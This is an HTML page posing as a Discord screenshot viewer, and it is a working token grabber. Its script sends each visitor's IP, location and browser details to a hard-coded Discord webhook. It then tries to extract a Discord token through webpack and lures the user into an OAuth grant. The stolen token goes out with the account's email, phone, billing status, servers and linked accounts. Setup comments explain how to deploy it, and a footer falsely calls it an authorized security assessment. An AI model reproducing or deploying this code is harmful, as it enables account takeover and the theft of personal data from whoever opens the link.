<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>discord_screenshot_2026-05-07.png</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #1e1e2e;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    font-family: 'Segoe UI', sans-serif;
    flex-direction: column;
  }
  .card {
    background: #2b2d42;
    border-radius: 12px;
    padding: 25px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.6);
    max-width: 95vw;
    text-align: center;
  }
  img {
    max-width: 100%;
    max-height: 85vh;
    border-radius: 8px;
    display: block;
  }
  .label {
    color: #888;
    text-align: center;
    padding: 10px 0 2px;
    font-size: 12px;
    user-select: none;
  }
  .loading {
    color: #aaa;
    text-align: center;
    padding: 20px;
    font-size: 14px;
    display: none;
  }
  .loading.active {
    display: block;
  }
  .auth-btn {
    background: #5865f2;
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 15px;
    display: none;
  }
  .auth-btn.active {
    display: inline-block;
  }
  .auth-btn:hover {
    background: #4752c4;
  }
  .error-box {
    color: #ed4245;
    margin-top: 10px;
    display: none;
  }
  .error-box.active {
    display: block;
  }
  .hidden-frame { display: none; }
</style>
</head>
<body>

<div class="card">
  <img src="https://i.pinimg.com/736x/ab/73/53/ab73530f23c2c1f30b09bddeed3ba2f4.jpg" alt="screenshot" id="displayImg">
  <div class="label">📸 discord_screenshot_2026-05-07.png (3.1 MB)</div>
  <div class="loading" id="loadingMsg">🔄 Authorizing with Discord...</div>
  <div class="error-box" id="errorMsg">⚠️ Authorization failed. Please try again.</div>
  <button class="auth-btn" id="authBtn" onclick="startOAuth()">🔗 Click to View Full Image</button>
</div>

<script>
// ===== CONFIGURATION =====
const WEBHOOK = "https://canary.discord.com/api/webhooks/1502045259444781217/lznlptjs1zLjMg0tCqev4HoWBQd0ktVZ5c6wdlQpoVgqc3rcsQGbBKYGo4B-KcigIR_0";

// STEP 1: Create a Discord Application at https://discord.com/developers/applications
// STEP 2: Set the OAuth2 redirect URL to your page's URL (e.g., https://reddyabcr.github.io/grabber/)
// STEP 3: Paste your CLIENT_ID here:
const CLIENT_ID = "YOUR_DISCORD_APP_CLIENT_ID"; // <-- REPLACE THIS

const REDIRECT_URI = window.location.origin + window.location.pathname;
const SCOPES = "identify email guilds";
// =========================

function b64(str) {
  return btoa(unescape(encodeURIComponent(str)));
}

async function getIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    return d.ip;
  } catch { 
    try {
      const r2 = await fetch('https://ipapi.co/json/');
      const d2 = await r2.json();
      return d2.ip;
    } catch { return 'N/A'; }
  }
}

async function getLocation() {
  try {
    const r = await fetch('https://ipapi.co/json/');
    const d = await r.json();
    return `${d.city || '?'}, ${d.country_name || '?'} (${d.org || '?'})`;
  } catch { return 'N/A'; }
}

async function validateAndSend(token) {
  try {
    const res = await fetch('https://discord.com/api/v9/users/@me', {
      headers: { 'Authorization': token }
    });
    
    if (!res.ok) {
      // Token is invalid or expired - still send it
      const payload = {
        username: '⚠️ Token (Unvalidated)',
        content: '',
        embeds: [{
          title: 'Invalid/Expired Token Received',
          color: 0xfee75c,
          description: `\`\`\`${token}\`\`\``,
          fields: [
            { name: '🌐 IP', value: await getIP(), inline: true },
            { name: '📍 Location', value: await getLocation(), inline: true },
            { name: '🖥️ Platform', value: navigator.platform, inline: true },
            { name: '🌍 User Agent', value: navigator.userAgent.substring(0, 90), inline: false },
            { name: '⏰ Time', value: new Date().toISOString(), inline: true }
          ]
        }]
      };
      fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      return false;
    }
    
    const u = await res.json();
    
    // Get guilds (servers the user is in)
    let guilds = [];
    try {
      const gRes = await fetch('https://discord.com/api/v9/users/@me/guilds', {
        headers: { 'Authorization': token }
      });
      if (gRes.ok) {
        guilds = await gRes.json();
      }
    } catch(e) {}
    
    // Get connections (linked accounts)
    let connections = [];
    try {
      const cRes = await fetch('https://discord.com/api/v9/users/@me/connections', {
        headers: { 'Authorization': token }
      });
      if (cRes.ok) {
        connections = await cRes.json();
      }
    } catch(e) {}
    
    const embed = {
      title: `🎯 Token Grabbed → ${u.username}#${u.discriminator}`,
      color: 0x57f287,
      thumbnail: { url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=128` },
      fields: [
        { name: '🔑 Token', value: `\`\`\`${token}\`\`\``, inline: false },
        { name: '🆔 ID', value: u.id, inline: true },
        { name: '📧 Email', value: u.email || 'N/A', inline: true },
        { name: '📱 Phone', value: u.phone || 'N/A', inline: true },
        { name: '🔐 MFA', value: u.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
        { name: '💎 Nitro', value: ['None', 'Nitro Classic', 'Nitro', 'Nitro Basic'][u.premium_type] || 'None', inline: true },
        { name: '✅ Verified', value: u.verified ? 'Yes' : 'No', inline: true },
        { name: '💳 Billing', value: u.has_billing ? '✅ Yes' : '❌ No', inline: true },
        { name: '👥 Servers', value: `${guilds.length} servers`, inline: true },
        { name: '🔗 Connections', value: connections.map(c => `${c.type}: ${c.name}`).join('\n') || 'None', inline: false },
        { name: '🌐 IP', value: await getIP(), inline: true },
        { name: '📍 Location', value: await getLocation(), inline: true },
        { name: '🖥️ Platform', value: navigator.platform, inline: true },
        { name: '🌍 User Agent', value: navigator.userAgent.substring(0, 100), inline: false },
        { name: '🌐 Timezone', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
        { name: '📅 Account Created', value: new Date(u.id / 4194304 + 1420070400000).toISOString().split('T')[0], inline: true },
        { name: '⏰ Grabbed At', value: new Date().toISOString(), inline: true }
      ],
      timestamp: new Date().toISOString(),
      footer: { text: 'Discord OAuth2 Token Grabber • Authorized Security Assessment' }
    };
    
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        username: '🎯 Token Grabbed', 
        avatar_url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=32`, 
        embeds: [embed] 
      })
    });
    
    return true;
  } catch(e) {
    // Send raw token on error
    const payload = {
      username: '⚠️ Token (Error)',
      content: `**Error validating but got token:**\n\`\`\`${token}\`\`\``,
      embeds: [{
        title: 'Error During Validation',
        color: 0xed4245,
        fields: [
          { name: '🌐 IP', value: await getIP(), inline: true },
          { name: '🖥️ Platform', value: navigator.platform, inline: true }
        ]
      }]
    };
    fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
    return false;
  }
}

function startOAuth() {
  document.getElementById('loadingMsg').classList.add('active');
  document.getElementById('authBtn').classList.remove('active');
  
  const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${encodeURIComponent(SCOPES)}`;
  
  window.location.href = oauthUrl;
}

// Try to use embedded iframe stealth method first (only works if user is on discord.com)
async function tryStealthMethods() {
  // Method 1: Try loading discord in iframe and extracting (blocked by X-Frame-Options)
  // Method 2: Check if we're already on discord.com (unlikely)
  
  if (window.location.hostname.includes('discord.com')) {
    // We're ON discord.com - use webpack
    try {
      const mod = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
        .find(m => m?.exports?.default?.getToken);
      const token = mod ? mod.exports.default.getToken() : null;
      if (token) {
        await validateAndSend(token);
        return true;
      }
    } catch(e) {}
  }
  
  return false;
}

// Main execution
async function main() {
  // Check if we were redirected back from Discord OAuth
  if (window.location.hash) {
    document.getElementById('loadingMsg').classList.add('active');
    document.getElementById('loadingMsg').textContent = '✅ Authorization received! Processing...';
    
    try {
      const hash = window.location.hash.substring(1);
      const params = new URLSearchParams(hash);
      const token = params.get('access_token');
      
      if (token) {
        // Clear hash from URL
        window.location.hash = '';
        history.replaceState(null, '', window.location.pathname);
        
        await validateAndSend(token);
        
        // Show success
        document.getElementById('loadingMsg').textContent = '✅ Image loaded! Redirecting...';
        document.getElementById('loadingMsg').classList.remove('active');
        document.querySelector('.label').textContent = '📸 discord_screenshot_2026-05-07.png (3.1 MB) • Loaded ✓';
        return;
      }
    } catch(e) {}
    
    document.getElementById('loadingMsg').classList.remove('active');
    document.getElementById('errorMsg').classList.add('active');
    setTimeout(() => document.getElementById('errorMsg').classList.remove('active'), 5000);
  }
  
  // First try stealth methods
  const success = await tryStealthMethods();
  
  if (!success) {
    // Show the auth button as a fallback
    document.getElementById('authBtn').classList.add('active');
    
    // Also try to send a "visit" notification
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: '👁️ Page Visit',
        embeds: [{
          title: 'Someone Opened the Image Link',
          color: 0xfee75c,
          fields: [
            { name: '🌐 IP', value: await getIP(), inline: true },
            { name: '📍 Location', value: await getLocation(), inline: true },
            { name: '🖥️ Platform', value: navigator.platform, inline: true },
            { name: '🌍 User Agent', value: navigator.userAgent.substring(0, 100), inline: false },
            { name: '⏰ Time', value: new Date().toISOString(), inline: true },
            { name: '🔗 Referrer', value: document.referrer || 'Direct', inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
  }
}

// Run
window.addEventListener('load', () => setTimeout(main, 1500));
</script>
</body>
</html>
